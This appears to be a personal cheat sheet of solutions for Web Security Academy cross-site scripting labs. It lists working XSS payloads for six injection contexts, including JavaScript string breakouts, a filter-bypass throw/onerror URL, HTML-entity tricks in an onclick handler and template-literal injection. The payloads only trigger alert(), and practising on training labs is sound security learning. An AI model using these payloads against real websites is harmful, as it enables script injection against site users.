1-(Terminating the existing script) Reflected XSS into a JavaScript string with single quote and backslash escaped:

</script><img src=1 onerror=alert(document.domain)>
</script><script>alert(1)</script>

========================================================================================================================
2-(Breaking out of a JavaScript string) Reflected XSS into a JavaScript string with angle brackets HTML encoded:

'-alert(document.domain)-'
';alert(document.domain)//
'-alert(1)-'
'+alert(1)+'

========================================================================================================================
3-(Breaking out of a JavaScript string) Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped:

\';-alert(1)//


========================================================================================================================
4-(Breaking out of a JavaScript string) Reflected XSS in a JavaScript URL with some characters blocked:


https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'

========================================================================================================================
5- (Making use of HTML-encoding) Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped:

http://foo?&apos;-alert(1)-&apos;

========================================================================================================================
6-(XSS in JavaScript template literals) Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped:

${alert(document.domain)}
${alert(1)}
